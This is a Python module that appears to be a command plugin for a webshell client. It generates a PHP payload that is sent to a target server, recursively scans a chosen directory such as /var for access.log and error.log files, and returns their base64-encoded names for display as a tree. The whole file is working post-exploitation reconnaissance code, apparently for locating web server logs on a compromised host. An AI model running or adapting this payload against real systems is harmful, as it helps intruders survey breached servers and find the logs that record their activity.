from libs.config import alias
from libs.myapp import send, color, print_tree
from json import JSONDecodeError


def get_php(file_path: str):
    return """$cfgs=array("access.log","error.log");
function filter($v,$vv){
    return strstr($v, $vv);
}
function scan_rescursive($directory) {
    global $cfgs;
    $res = array();
    foreach(glob("$directory/*") as $item) {
        if(is_dir($item)) {
            $items=explode('/', $item);
            $folder = base64_encode(end($items));
            $res[$folder] = scan_rescursive($item);
            continue;
        }
        else if (count(array_filter(array_map("filter", array_fill(0, count($cfgs), $item), $cfgs)))){
            $res[] = base64_encode(basename($item));
        }
    }
    return $res;
}
print(json_encode(scan_rescursive("%s")));""" % file_path


@alias(True, _type="DETECT", fp="web_file_path")
def run(web_file_path: str = "/var"):
    """
    fl

    Search log file (access.log,error.log) from target system.

    eg: fl {web_file_path="/var"}
    """
    php = get_php(web_file_path)
    try:
        res = send(php)
        if (not res):
            return
        file_tree = res.r_json()
    except JSONDecodeError:
        print(color.red("Parse Error"))
        return
    print_tree(web_file_path, file_tree)
